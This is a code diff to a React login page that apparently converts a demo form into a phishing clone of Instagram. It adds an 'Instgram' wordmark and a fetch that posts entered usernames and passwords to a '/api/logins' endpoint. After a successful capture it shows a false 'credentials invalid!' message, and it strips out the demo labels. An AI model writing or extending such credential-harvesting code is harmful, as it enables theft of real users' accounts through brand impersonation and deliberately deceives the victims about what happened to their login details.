@@ -7,21 +7,36 @@ export default function LoginPage() {
 
   async function handleSubmit(e) {
     e.preventDefault();
+
     if (!username || !password) {
       setMsg("Please enter username and password.");
       return;
     }
 
-    // fake post for demo
-    setMsg("credentials invalid!");
-    setUsername("");
-    setPassword("");
+    try {
+      const res = await fetch("/api/logins", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username, password }),
+      });
+      const data = await res.json();
+      if (data.success) {
+        setMsg("credentials invalid!");
+        setUsername("");
+        setPassword("");
+      } else {
+        setMsg("Failed to send login data.");
+      }
+    } catch {
+      setMsg("Network error.");
+    }
   }
 
   return (
     <div className="page-wrapper">
       <div className="login-box">
-        <div className="logo-placeholder">Demo</div>
+        {/* Fixed title */}
+        <h1 className="wordmark">Instgram</h1>
 
         <form onSubmit={handleSubmit} className="login-form">
           <input
@@ -30,7 +45,9 @@ export default function LoginPage() {
             onChange={(e) => setUsername(e.target.value)}
             placeholder="Username or email"
             autoComplete="off"
+            spellCheck="false"
           />
+
           <input
             id="password"
             type="password"
@@ -38,21 +55,13 @@ export default function LoginPage() {
             onChange={(e) => setPassword(e.target.value)}
             placeholder="Password"
             autoComplete="off"
+            spellCheck="false"
           />
+
           <button type="submit">Log In</button>
         </form>
 
         {msg && <div className="message">{msg}</div>}
-
-        <a href="#" className="forgot-link">
-          Forgot password?
-        </a>
-
-        <div className="divider" />
-
-        <button className="create-btn">Create new account</button>
-
-        <div className="meta-footer">© 2025 Demo App</div>
       </div>
     </div>
   );
